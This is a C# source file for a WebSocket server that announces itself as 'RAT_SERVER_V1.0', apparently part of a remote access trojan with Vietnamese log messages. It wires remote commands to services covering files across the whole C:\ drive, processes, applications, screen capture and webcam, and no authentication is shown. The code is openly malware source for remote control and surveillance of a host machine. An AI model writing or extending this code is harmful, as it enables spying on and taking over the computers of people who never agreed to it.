using System;
using System.Diagnostics;
using System.Net;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using System.Text.Json;
using System.IO;
using System.Collections.Generic;
using WebSocketTest.Models;

namespace WebSocketTest
{
    public class SimpleWebSocketServer
    {
        private HttpListener? _listener;
        private Core.Server? _server;
        private Core.Router? _router;
        private readonly Action<string> _logger = _ => { };
        private Core.Connection? _client;        
        private bool _isRunning = false;
        public SimpleWebSocketServer(Action<string> loggerMethod)
        {
            if (loggerMethod == null) throw new ArgumentNullException(nameof(loggerMethod));
            _logger = loggerMethod;

            // Default root
            string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            // Try preferred root (C:\) but keep fallback if it fails
            string root = homeDir;
            try
            {
                // prefer C:\ if available
                if (Directory.Exists("C:\\")) root = @"C:\";
            }
            catch { }

            // Initialize services and router
            var appService = new Services.AppService();
            var processService = new Services.ProcessService();
            var fileService = new Services.FileService(root, maxStreamFileSizeBytes: 500L * 1024 * 1024);
            var screenService = new Services.ScreenService();
            var webcamService = new Services.WebcamService();

            _router = new Core.Router(appService, processService, fileService, screenService, webcamService, SendToClient);
        }

        public async void Start(string url)
        {
            _server = new Core.Server(_logger);
            _ = _server.Start(url, ProcessClient);
        }

        public void Stop() => _server?.Stop();

        private async Task ProcessClient(HttpListenerContext context)
        {
            var wsContext = await context.AcceptWebSocketAsync(null);
            _client = new Core.Connection(wsContext.WebSocket);
            _logger("Client đã kết nối!");
            var handshake = new 
            { 
                type = "handshake", 
                server_name = "RAT_SERVER_V1.0",
                version = "1.0",
                timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
            };
            await _client.SendAsync(JsonSerializer.Serialize(handshake));

            byte[] buffer = new byte[10 * 1024 * 1024];

            try
            {
                while (_client.IsConnected)
                {
                    var result = await _client.Socket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    if (result.MessageType == WebSocketMessageType.Close) break;

                    string message = Encoding.UTF8.GetString(buffer, 0, result.Count);
                    _logger($"[Client]: {message}");

                    string response = _router != null ? _router.Dispatch(message) : HandleCommand(message);
                    await _client.SendAsync(response);
                }
            }
            catch (Exception ex) { _logger("Lỗi kết nối: " + ex.Message); }
            finally 
            { 
                _client?.Dispose();
                _client = null;
            }
        }

        public async Task SendToClient(string msg)
        {
            if (_client != null)
            {
                await _client.SendAsync(msg);
            }
        }

        private string HandleCommand(string command)
        {
            if (_router != null) return _router.Dispatch(command);
            return JsonResponse.Info("Router not initialized");
        }
    }
}